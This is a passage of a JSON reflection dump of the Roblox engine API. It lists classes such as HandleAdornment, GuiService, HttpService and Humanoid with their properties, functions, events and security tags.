ntent","type":"Property","Name":"Texture","tags":[],"Class":"FloorWire"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"To","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"WireRadius","tags":[],"Class":"FloorWire"},{"Superclass":"GuiBase3d","type":"Class","Name":"PVAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PVAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"HandleAdornment","tags":[]},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"HandleAdornment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"HandleAdornment"},{"ValueType":"Vector3","type":"Property","Name":"SizeRelativeOffset","tags":[],"Class":"HandleAdornment"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"HandleAdornment"},{"Arguments":[],"Name":"MouseButton1Down","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseButton1Up","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseEnter","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseLeave","tags":[],"Class":"HandleAdornment","type":"Event"},{"Superclass":"HandleAdornment","type":"Class","Name":"BoxHandleAdornment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BoxHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ConeHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"ConeHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"ConeHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"CylinderHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"CylinderHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"CylinderHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ImageHandleAdornment","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageHandleAdornment"},{"ValueType":"Vector2","type":"Property","Name":"Size","tags":[],"Class":"ImageHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"LineHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"LineHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"LineHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"SphereHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"SphereHandleAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionBox","tags":[]},{"ValueType":"float","type":"Property","Name":"LineThickness","tags":[],"Class":"SelectionBox"},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionBox"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionBox"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionBox"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionSphere","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionSphere"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionSphere"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionSphere"},{"Superclass":"GuiBase3d","type":"Class","Name":"PartAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PartAdornment"},{"Superclass":"PartAdornment","type":"Class","Name":"HandlesBase","tags":[]},{"Superclass":"HandlesBase","type":"Class","Name":"ArcHandles","tags":[]},{"ValueType":"Axes","type":"Property","Name":"Axes","tags":[],"Class":"ArcHandles"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Down","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Up","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"},{"Name":"relativeAngle","Type":"float"},{"Name":"deltaRadius","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseEnter","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseLeave","tags":[],"Class":"ArcHandles","type":"Event"},{"Superclass":"HandlesBase","type":"Class","Name":"Handles","tags":[]},{"ValueType":"Faces","type":"Property","Name":"Faces","tags":[],"Class":"Handles"},{"ValueType":"HandlesStyle","type":"Property","Name":"Style","tags":[],"Class":"Handles"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Down","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Up","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"},{"Name":"distance","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseEnter","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseLeave","tags":[],"Class":"Handles","type":"Event"},{"Superclass":"PartAdornment","type":"Class","Name":"SurfaceSelection","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":[],"Class":"SurfaceSelection"},{"Superclass":"GuiBase3d","type":"Class","Name":"SelectionLasso","tags":[]},{"ValueType":"Object","type":"Property","Name":"Humanoid","tags":[],"Class":"SelectionLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPartLasso","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Part","tags":[],"Class":"SelectionPartLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPointLasso","tags":["deprecated"]},{"ValueType":"Vector3","type":"Property","Name":"Point","tags":[],"Class":"SelectionPointLasso"},{"Superclass":"GuiBase3d","type":"Class","Name":"TextureTrail","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"From","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"To","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"Superclass":"Instance","type":"Class","Name":"GuiItem","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"Backpack","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"BackpackItem","tags":[]},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"BackpackItem"},{"Superclass":"BackpackItem","type":"Class","Name":"HopperBin","tags":["deprecated"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"HopperBin"},{"ValueType":"BinType","type":"Property","Name":"BinType","tags":[],"Class":"HopperBin"},{"ReturnType":"void","Arguments":[],"Name":"Disable","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleSelect","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"Arguments":[],"Name":"Deselected","tags":[],"Class":"HopperBin","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Selected","tags":[],"Class":"HopperBin","type":"Event"},{"Superclass":"BackpackItem","type":"Class","Name":"Tool","tags":[]},{"ValueType":"bool","type":"Property","Name":"CanBeDropped","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Tool"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Grip","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripForward","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripPos","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripRight","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripUp","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"ManualActivationOnly","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"RequiresHandle","tags":[],"Class":"Tool"},{"ValueType":"string","type":"Property","Name":"ToolTip","tags":[],"Class":"Tool"},{"ReturnType":"void","Arguments":[],"Name":"Activate","tags":[],"Class":"Tool","type":"Function"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"Tool","type":"Event"},{"Superclass":"Tool","type":"Class","Name":"Flag","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Flag"},{"Superclass":"GuiItem","type":"Class","Name":"ButtonBindingWidget","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"GuiRoot","tags":["notCreatable"]},{"Superclass":"GuiItem","type":"Class","Name":"Hopper","tags":["deprecated"]},{"Superclass":"GuiItem","type":"Class","Name":"StarterPack","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GuiService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AutoSelectGuiEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"CoreGuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"GuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsModalDialog","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsWindows","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"MenuIsOpen","tags":["readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"ScreenGuiEnabled","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedCoreObject","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedObject","tags":[],"Class":"GuiService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null},{"Type":"CenterDialogType","Name":"centerDialogType","Default":null},{"Type":"Function","Name":"showFunction","Default":null},{"Type":"Function","Name":"hideFunction","Default":null}],"Name":"AddCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Instance","Name":"selectionParent","Default":null}],"Name":"AddSelectionParent","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Tuple","Name":"selections","Default":null}],"Name":"AddSelectionTuple","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"AddSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetBrickCount","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"GetClosestDialogToPosition","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetErrorMessage","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetUiMessage","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsTenFootInterface","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenBrowserWindow","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null}],"Name":"RemoveCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null}],"Name":"RemoveSelectionGroup","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"RemoveSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"errorMessage","Default":null}],"Name":"SetErrorMessage","tags":["LocalUserSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x1","Default":null},{"Type":"int","Name":"y1","Default":null},{"Type":"int","Name":"x2","Default":null},{"Type":"int","Name":"y2","Default":null}],"Name":"SetGlobalGuiInset","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"open","Default":null}],"Name":"SetMenuIsOpen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UiMessageType","Name":"msgType","Default":null},{"Type":"string","Name":"uiMessage","Default":null}],"Name":"SetUiMessage","tags":["LocalUserSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"ShowStatsBasedOnInputString","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleFullscreen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetScreenResolution","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"YieldFunction"},{"Arguments":[],"Name":"BrowserWindowClosed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"newErrorMessage","Type":"string"}],"Name":"ErrorMessageChanged","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"EscapeKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"},{"Name":"modifiers","Type":"string"}],"Name":"KeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuClosed","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuOpened","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"ShowLeaveConfirmation","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"SpecialKey"},{"Name":"modifiers","Type":"string"}],"Name":"SpecialKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"msgType","Type":"UiMessageType"},{"Name":"newUiMessage","Type":"string"}],"Name":"UiMessageChanged","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"ReturnType":"void","Arguments":[{"Name":"title","Type":"string"},{"Name":"text","Type":"string"}],"Name":"SendCoreUiNotification","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"GuidRegistryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"HapticService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"GetMotor","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"IsMotorSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null}],"Name":"IsVibrationSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null},{"Type":"Tuple","Name":"vibrationValues","Default":null}],"Name":"SetMotor","tags":[],"Class":"HapticService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"HttpRbxApiService","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"}],"Name":"GetAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"}],"Name":"PostAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"HttpService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"HttpEnabled","tags":["LocalUserSecurity"],"Class":"HttpService"},{"ReturnType":"string","Arguments":[{"Type":"bool","Name":"wrapInCurlyBraces","Default":"true"}],"Name":"GenerateGUID","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"JSONDecode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"Variant","Name":"input","Default":null}],"Name":"JSONEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"UrlEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"nocache","Default":"false"}],"Name":"GetAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"},{"Type":"bool","Name":"compress","Default":"false"}],"Name":"PostAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Humanoid","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"AutoRotate","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"CameraOffset","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidDisplayDistanceType","type":"Property","Name":"DisplayDistanceType","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"Health","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HipHeight","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Jump","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"JumpPower","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"LeftLeg","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxHealth","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxSlopeAngle","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"MoveDirection","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"NameOcclusion","type":"Property","Name":"NameOcclusion","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"PlatformStand","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidRigType","type":"Property","Name":"RigType","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"RightLeg","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"SeatPart","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Sit","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"TargetPoint","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"Torso","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"WalkSpeed","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"WalkToPart","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"WalkToPoint","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"maxHealth","tags":["deprecated"],"Class":"Humanoid"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"AddCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"AddStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":"None"}],"Name":"ChangeState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"tool","Default":null}],"Name":"EquipTool","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"HumanoidStateType","Arguments":[],"Name":"GetState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null}],"Name":"GetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStatuses","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"HasCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"HasStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"moveDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null},{"Type":"Instance","Name":"part","Default":"nil"}],"Name":"MoveTo","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"RemoveCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"RemoveStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetClickToWalkEnabled","tags":["RobloxScriptSecurity"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"TakeDamage","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnequipTools","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"loadAnimation","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"takeDamage","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Climbing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[],"Name":"Died","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FallingDown","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FreeFalling","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"GettingUp","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"health","Type":"float"}],"Name":"HealthChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Jumping","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"reached","Type":"bool"}],"Name":"MoveToFinished","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"PlatformStanding","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Ragdoll","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Running","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"},{"Name":"currentSeatPart","Type":"Instance"}],"Name":"Seated","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"old","Type":"HumanoidStateType"},{"Name":"new","Type":"HumanoidStateType"}],"Name":"StateChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"state","Type":"HumanoidStateType"},{"Name":"isEnabled","Type":"bool"}],"Name":"StateEnabledChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Strafing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Swimming","tags":[],"Class":"Humanoid","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"InputObject","tags":["notCreatable"]},{"ValueType":"Vector3","type":"Property","Name":"Delta","tags":[],"Class":"InputObject"},{"ValueType":"KeyCode","type":"Property","Name":"KeyCode","tags":[],"Class":"InputObject"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"InputObject"},{"ValueType":"UserInputState","type":"Property","Name":"UserInputState","tags":[],"Class":"InputObject"},{"ValueType":"UserInputType","type":"Property","Name":"UserInputType","tags":[],"Class":"InputObject"},{"Superclass":"Instance","type":"Class","Name":"InsertService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AllowInsertFreeModels","tags":[],"Class":"InsertService"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"ApproveAssetId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"ApproveAssetVersionId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null}],"Name":"Insert","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null},{"Type":"bool","Name":"user","Default":"false"}],"Name":"SetAdvancedResults","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetUrl","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetVersionUrl","Default":